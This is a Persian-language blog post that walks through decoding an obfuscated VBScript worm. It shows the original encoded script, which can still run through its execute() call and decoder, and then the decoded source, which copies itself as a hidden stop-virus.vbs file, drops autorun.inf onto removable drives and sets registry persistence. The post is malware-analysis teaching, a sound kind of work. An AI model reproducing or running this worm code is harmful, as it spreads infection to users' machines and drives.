<!doctype html><html lang="fa" dir="rtl"><head><script async src="https://www.googletagmanager.com/gtag/js?id=G-HTH8HV1F9Z"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-HTH8HV1F9Z', { 'anonymize_ip': false });
}
</script><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="ie=edge"><meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name="keywords" content="آموزش کامپیوتر,برنامه نویسی,VBScript,وی بی اسکریپت,دروپال,Drupal,آموزش برنامه نویسی,طراحی وب,وب,طراحی وب حرفه ای,سیستم عامل,هک,امنیت,مقالات VBScript,فایل,وبگاه,آموزش دروپال,قدم به قدم,مبتدی,حرفه ای,ترفند,بهترین,php,پی اچ پی,css,javascript,html,جاوا اسکریپت,اچ تی ام ال,seo,بهینه سازی,بهینه سازی برای موتور های جستجو,Search Engine Optimization,آشیانه,کتاب,کتاب الکترونیکی,دانلود,وبلاگ,hejazee,hejazi,ashiyane,موتور جستجو"><meta name="geo.region" content="IRAN"><link rel="canonical" href="https://hejazee.ir/posts/1390/08/%D8%B1%D9%85%D8%B2-%DA%AF%D8%B4%D8%A7%DB%8C%DB%8C-%DB%8C%DA%A9-%D9%88%DB%8C%D8%B1%D9%88%D8%B3-vbscript-%D8%A7%DB%8C/"><link rel="shortcut icon" href="/favicon.ico" type="image/png"><title>رمز گشایی یک ویروس VBScript ای! | وبلاگ رسمی احمد حجازی</title><link rel="stylesheet" href="/lib/bootstrap-5.1.3-dist/css/bootstrap.rtl.min.css"><link rel="stylesheet" href="/lib/fontawesome-free-5.15.2-web/css/all.min.css"><link rel="stylesheet" href="/fonts/fonts.css"><link rel="stylesheet" href="/scss/index.172bdd1266bb92eb39450b3215cc97ecd4d7ec43ae649679fe3140f189d01c32.css" integrity="sha256-FyvdEma7kus5RQsyFcyX7NTX7EOuZJZ5/jFA8YnQHDI=" crossorigin="anonymous"></head><body><nav class="navbar navbar-expand-lg navbar-dark bg-dark" id="farsaran-header-nav"><div class="container"><a class="navbar-brand order-0 flex-grow-1 flex-lg-grow-0" href="/"><img src="/logo.svg" alt="وبلاگ رسمی احمد حجازی" height="34"></a>
<button class="navbar-toggler order-2 order-lg-1" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="نمایش منو">
<span class="navbar-toggler-icon"></span></button><div class="collapse navbar-collapse mb-3 mb-lg-0" id="navbarSupportedContent"><ul class="navbar-nav me-auto mb-2 mb-lg-0"><li class="nav-item"><a class="nav-link" href="/contact/">تماس</a></li><li class="nav-item"><a class="nav-link" href="/about/">درباره</a></li></ul></div></div></nav><div class="container mt-4"><div class="row"><div class="col-md-9"><header><h1 class="post-title fw-bold fs-2"><a class="text-dark" href="/posts/1390/08/%D8%B1%D9%85%D8%B2-%DA%AF%D8%B4%D8%A7%DB%8C%DB%8C-%DB%8C%DA%A9-%D9%88%DB%8C%D8%B1%D9%88%D8%B3-vbscript-%D8%A7%DB%8C/">رمز گشایی یک ویروس VBScript ای!</a></h1></header><small class="d-block text-secondary post-date">ارسال شده در
<time datetime="2011-11-11">Nov 11, 2011</time></small><article class="blog-post" role="article" typeof="schema:Article"><p>اخیرا یکی از دوستان یک برنامه ی VBScript به من داد که رمز گذاری شده بود و از من خواست که آن را به حالت عادی در بیاورم.<br>این برنامه ظاهرا متعلق به یک ویروس است و با یک الگوریتم ساده رمز گذاری شده است.<br>من آن را خیلی راحت از حالت رمز گذاری شده به حالت عادی برگرداندم و در این جا می خواهم روش کار را توضیح دهم.</p><p>متن اصلی ویروس این است:</p><div style="direction:ltr!important"><pre style="white-space:normal">'log!n ---&gt;&lt;..Presents..&gt;&lt;--- st!cky_w0rM
'
'b0rN 0n 07-12-2009 1620
'
maz1 = "po!fssps!sftvnf!ofyu;ejn!gtp-gjmf-wctdpqz;ep;Tfu!gtp!&gt;!DsfbufPckfdu)#Tdsjqujoh/GjmfTztufnPckfdu#*;svoBP!&gt;!#\bvupsvo^#!;svoBP2!&gt;!# tifmmfyfdvuf&gt;xtdsjqu/fyf!tupq.wjsvt/wct#!;Ejn!sh;Tfu!sh!&gt;!DsfbufPckfdu)#XTdsjqu/Tifmm#*;Ejn!n2-uyu-t{-wdpef-difdl!;Tfu!n2!&gt;!gtp/HfuGjmf)XTdsjqu/TdsjquGvmmobnf*!;t{!&gt;!n2/tj{f!;difdl!&gt;!n2/Esjwf/esjwfuzqf!;Tfu!uyu!&gt;!n2/pqfobtufyutusfbn)2-!.3*!;Ep!Xijmf!Opu!uyu/bufoepgtusfbn!;wdpef!&gt;!wdpef!'!uyu/sfbemjof!;wdpef!&gt;!wdpef!'!wcDsMg!;Mppq!;sh/SfhXsjuf!#ILFZ`DVSSFOU`VTFS]Tpguxbsf]Njdsptpgu]Xjoepxt!Tdsjqu!Iptu]Tfuujoht]Ujnfpvu#-1-#SFH`EXPSE#!;ejn!ug!;Tfu!ejsxjo!&gt;!gtp/HfuTqfdjbmGpmefs)3*!;Jg!Opu!)gtp/gjmffyjtut)ejsxjo!'#]tupq.wjsvt/wct#**!Uifo!;Tfu!ug!&gt;!gtpF]fuGjmf)ejsxjo!'#]tupq.wjsvt/wct#*!;ug/Buusjcvuft!&gt;!43!;Tfu!ug!&gt;!gtp/DsfbufUfyuGjmf)ejsxjo!'#]tupq.wjsvt/wct#-!3-!Usvf*!;ug/Xsjuf!wdpef!;ug/Dmptf!;Foe!jg!;Tfu!ug!&gt;!gtp/HfuGjmf)ejsxjo!'#]tupq.wjsvt/wct#*;ug/Buusjcvuft!&gt;!4:!;sh/SfhXsjuf!#ILFZ`MPDBM`NBDIJOF]TPGUXBSF]Njdsptpgu]Xjoepxt]DvssfouWfstjpo]qpmjdjft]fyqmpsfs]svo]TztEmm22#-#xtdsjqu/fyf!#!'!ejsxjo!'#]tupq.wjsvt/wct#!;ejn!ushuesw2!;Gps!Fbdi!ushuesw2!Jo!gtp/esjwft!;Jg)ushuesw2/esjwfuzqf!&gt;!2*!Boe!ushuesw2/Qbui!=?!#B;#!Uifo!;Jg!Opu!)gtp/gjmffyjtut)ushuesw2/Qbui!'#]tupq.wjsvt/wct#**!Uifo!;Tfu!ug!&gt;!gtp/HfuGjmf)ushuesw2/Qbui!'#]tupq.wjsvt/wct#*!;ug/Buusjcvuft!&gt;!43!;Tfu!ug!&gt;!gtp/DsfbufUfyuGjmf)ushuesw2/Qbui!'#]tupq.wjsvt/wct#-!3-!Usvf*!;ug/Xsjuf!wdpef!;ug/Dmptf!;Foe!jg!;Tfu!ug!&gt;!gtp/HfuGjmf)ushuesw2/Qbui!'#]tupq.wjsvt/wct#*;ug/Buusjcvuft!&gt;!4:!;Jg!Opu!)gtp/gjmffyjtut)ushuesw2/Qbui!'#]bvupsvo/jog#**!Uifo!;Tfu!ug!&gt;!gtp/HfuGjmf)ushuesw2/Qbui!'#]bvupsvo/jog#*!;ug/Buusjcvuft!&gt;!43!;Tfu!ug!&gt;!gtp/DsfbufUfyuGjmf)ushuesw2/Qbui!'#]bvupsvo/jog#-!3-!Usvf*!;ug/XsjufMjof!svoBP!;ug/XsjufMjof!svoBP2!;ug/Dmptf!;Foe!jg!;Tfu!ug!&gt;!gtp/HfuGjmf)ushuesw2/Qbui!'#]bvupsvo/jog#*!;ug/Buusjcvuft!&gt;!4:!;Foe!jg!;Ofyu!;Jg!difdl!=?!2!Uifo! ;XTdsjqu/tmffq!:111!;Foe!Jg!;wdpef&gt;##!;Mppq!Xijmf!)difdl!=? !2*"
execute(dec(maz1))
Function dec(s):For i = 1 To Len(s):T = Mid(s, i, 1):T = Chr(Asc(T) -1):Coded = Coded + T:Next:dec = coded:End Function 
</pre></div><p>من ابتدا متن فوق را در notepad++ کپی کردم و مشاهده کردم که برنامه از سه قسمت تشکیل شده است:</p><p dir="rtl">قسمت اول که مقداری Comment است:</p><pre class="brush: vb;fontsize: 100; first-line: 1;">'log!n ---&gt;&lt;..Presents..&gt;&lt;--- st!cky_w0rM
'
'b0rN 0n 07-12-2009 1620
'</pre><p dir="rtl"></p><p dir="rtl">قسمت دوم شامل دستورات زیر است:</p><pre class="brush: vb;fontsize: 100; first-line: 1;">maz1 = "po!fssps!sf .... "
exec(dec(maz1))</pre><p dir="rtl">یعنی یک متغیر به نام maz1 تعریف شده که محتوای آن یک رشته ی رمز گذاری شده است. این رشته را ابتدا توسط تابع dec از حالت رمز شده در می آورد و سپس با تابع exec آن را اجرا می کند.</p><p dir="rtl">قسمت سوم هم که تعریف تابع dec است:</p><pre class="brush: as3;fontsize: 100; first-line: 1;">Function dec(s):For i = 1 To Len(s):T = Mid(s, i, 1):T = Chr(Asc(T) -1):Coded = Coded + T:Next:dec = coded:End Function</pre><p dir="rtl">بنابراین کار خیلی ساده است!<br>کافی است که کلمه ی exec را در قسمت دوم به کلمه ی msgbox تغییر دهیم تا برنامه ی کد شده، بعد از این که دیکد شد، اجرا نشود. بلکه توسط تابع msgbox به ما نشان داده شود<br>من هم در سورس برنامه، exec را پاک کردم و به جای آن نوشتم msgbox و سپس برنامه را اجرا کردم<br>سورس برنامه در داخل یک پیغام msgbox نمایش داده شد.</p><p dir="rtl">سپس در روی کی بورد دکمه های Alt + Ctrl + Insert را فشار دادم تا متن موجود در MSgBox به Clipboard من کپی شود.<br>سپس به notepad++ برگشتم و یک تب جدید باز کردم و با Ctrl + V متن موجود در Clipboard را Paste کردم<br>و به همین راحتی به سورس برنامه دست پیدا کردم!<br><br></p><div style="direction:ltr!important">on error resume next:dim fso,file,vbscopy:do:Set fso = CreateObject("Scripting.FileSystemObject"):runAO = "[autorun]" :runAO1 = "shellexecute=wscript.exe stop-virus.vbs" :Dim rg:Set rg = CreateObject("WScript.Shell"):Dim m1,txt,sz,vcode,check :Set m1 = fso.GetFile(WScript.ScriptFullname) :sz = m1.size :check = m1.Drive.drivetype :Set txt = m1.openastextstream(1, -2) :Do While Not txt.atendofstream :vcode = vcode & txt.readline :vcode = vcode & vbCrLf :Loop :rg.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Script Host\Settings\Timeout",0,"REG_DWORD" :dim tf :Set dirwin = fso.GetSpecialFolder(2) :If Not (fso.fileexists(dirwin &"\stop-virus.vbs")) Then :Set tf = fsoE\etFile(dirwin &"\stop-virus.vbs") :tf.Attributes = 32 :Set tf = fso.CreateTextFile(dirwin &"\stop-virus.vbs", 2, True) :tf.Write vcode :tf.Close :End if :Set tf = fso.GetFile(dirwin &"\stop-virus.vbs"):tf.Attributes = 39 :rg.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\explorer\run\SysDll11","wscript.exe</div><p>اکنون برای این که سورس به دست آمده خوانا شود، باید دو تا کار دیگر نیز انجام داد.<br>همان طور که می بینید در برنامه ی فوق، با جای این که برنامه را در چند خط بنویسد، همه را در یک خط نوشته است و به جای رفتن به خط جدید، از علامت : استفاده کرده.<br>کافی است در notepad++ کاراکتر : را با علامت خط جدید replace کنیم<br>برای این منظور، من در محیط notepad++ دکمه ی Ctrl + H را فشار دادم تا پنجره ی replace باز شد.<br>در قسمت Find تایپ کردم :<br>و در قسمت Replace with تایپ کردم \r\n<br>و در قسمت Search Mode گزینه ی دوم (Extended) را انتخاب کردم.<br>آن گاه دکمه ی Replace All را کلیک کردم و سورس برنامه را به دست آوردم</p><pre class="brush: vb;fontsize: 100; first-line: 1;">on error resume next
dim fso,file,vbscopy
do
Set fso = CreateObject("Scripting.FileSystemObject")
runAO = "[autorun]" 
runAO1 = "shellexecute=wscript.exe stop-virus.vbs" 
Dim rg
Set rg = CreateObject("WScript.Shell")
Dim m1,txt,sz,vcode,check 
Set m1 = fso.GetFile(WScript.ScriptFullname) 
sz = m1.size 
check = m1.Drive.drivetype 
Set txt = m1.openastextstream(1, -2) 
Do While Not txt.atendofstream 
vcode = vcode &amp; txt.readline 
vcode = vcode &amp; vbCrLf 
Loop 
rg.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Script Host\Settings\Timeout",0,"REG_DWORD" 
dim tf 
Set dirwin = fso.GetSpecialFolder(2) 
If Not (fso.fileexists(dirwin &amp;"\stop-virus.vbs")) Then 
Set tf = fsoE\etFile(dirwin &amp;"\stop-virus.vbs") 
tf.Attributes = 32 
Set tf = fso.CreateTextFile(dirwin &amp;"\stop-virus.vbs", 2, True) 
tf.Write vcode 
tf.Close 
End if 
Set tf = fso.GetFile(dirwin &amp;"\stop-virus.vbs")
tf.Attributes = 39 
rg.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\explorer\run\SysDll11","wscript.exe</pre><p>اکنون می توان تورفتگی ها را نیز اصلاح کرد....</p><p>از برنامه نویس این ویروس (!) عذر می خواهم!<br>البته نمی دانم این برنامه برای چی نوشته شده بوده. شاید ویروس بوده شاید هم تستی بوده. ولی من تعجب می کنم از این برنامه...<br>من به اسم ویروس این برنامه رو دریافت کردم. دیگر نمی دانم واقعا ویروس است یا سر کاری هست. بیشتر به سرکاری شبیه است تا ویروس...</p></article></div><aside class="col-md-3 mt-4"><h3>Monthly Archive</h3><ul><li><a href="/month/1395-06/" title="All posts from 1395-06">1395-06</a> (1)</li><li><a href="/month/1395-01/" title="All posts from 1395-01">1395-01</a> (1)</li><li><a href="/month/1394-12/" title="All posts from 1394-12">1394-12</a> (3)</li><li><a href="/month/1394-08/" title="All posts from 1394-08">1394-08</a> (1)</li><li><a href="/month/1394-07/" title="All posts from 1394-07">1394-07</a> (1)</li><li><a href="/month/1394-03/" title="All posts from 1394-03">1394-03</a> (1)</li><li><a href="/month/1394-02/" title="All posts from 1394-02">1394-02</a> (1)</li><li><a href="/month/1393-12/" title="All posts from 1393-12">1393-12</a> (1)</li><li><a href="/month/1393-07/" title="All posts from 1393-07">1393-07</a> (1)</li><li><a href="/month/1393-06/" title="All posts from 1393-06">1393-06</a> (2)</li><li><a href="/month/1393-05/" title="All posts from 1393-05">1393-05</a> (2)</li><li><a href="/month/1393-04/" title="All posts from 1393-04">1393-04</a> (4)</li><li><a href="/month/1393-03/" title="All posts from 1393-03">1393-03</a> (5)</li><li><a href="/month/1393-02/" title="All posts from 1393-02">1393-02</a> (1)</li><li><a href="/month/1393-01/" title="All posts from 1393-01">1393-01</a> (4)</li><li><a href="/month/1392-12/" title="All posts from 1392-12">1392-12</a> (5)</li><li><a href="/month/1392-10/" title="All posts from 1392-10">1392-10</a> (5)</li><li><a href="/month/1392-06/" title="All posts from 1392-06">1392-06</a> (1)</li><li><a href="/month/1392-04/" title="All posts from 1392-04">1392-04</a> (1)</li><li><a href="/month/1392-02/" title="All posts from 1392-02">1392-02</a> (1)</li><li><a href="/month/1392-01/" title="All posts from 1392-01">1392-01</a> (5)</li><li><a href="/month/1391-11/" title="All posts from 1391-11">1391-11</a> (5)</li><li><a href="/month/1391-10/" title="All posts from 1391-10">1391-10</a> (4)</li><li><a href="/month/1391-09/" title="All posts from 1391-09">1391-09</a> (2)</li><li><a href="/month/1391-08/" title="All posts from 1391-08">1391-08</a> (3)</li><li><a href="/month/1391-07/" title="All posts from 1391-07">1391-07</a> (6)</li><li><a href="/month/1391-05/" title="All posts from 1391-05">1391-05</a> (1)</li><li><a href="/month/1391-04/" title="All posts from 1391-04">1391-04</a> (1)</li><li><a href="/month/1391-03/" title="All posts from 1391-03">1391-03</a> (2)</li><li><a href="/month/1391-02/" title="All posts from 1391-02">1391-02</a> (4)</li><li><a href="/month/1391-01/" title="All posts from 1391-01">1391-01</a> (6)</li><li><a href="/month/1390-12/" title="All posts from 1390-12">1390-12</a> (9)</li><li><a href="/month/1390-11/" title="All posts from 1390-11">1390-11</a> (8)</li><li><a href="/month/1390-10/" title="All posts from 1390-10">1390-10</a> (7)</li><li><a href="/month/1390-09/" title="All posts from 1390-09">1390-09</a> (4)</li><li><a href="/month/1390-08/" title="All posts from 1390-08">1390-08</a> (7)</li><li><a href="/month/1390-07/" title="All posts from 1390-07">1390-07</a> (14)</li><li><a href="/month/1390-06/" title="All posts from 1390-06">1390-06</a> (18)</li></ul></aside></div></div><footer id="footer-wrapper"><div id="footer-bottom-wrapper"><div class="container"><div class="row"><div class="col-12"><p dir="ltr">&copy; Copyright 2011-2022 * Ahmad Hejazee * All rights reserved.</p><small dir="ltr">Proudly Powered by Drupal 10 ;)</small></div></div></div></div></footer><script src="/lib/jQuery/jquery-3.6.0.min.js"></script>
<script src="/lib/bootstrap-5.1.3-dist/js/bootstrap.bundle.min.js"></script></body></html>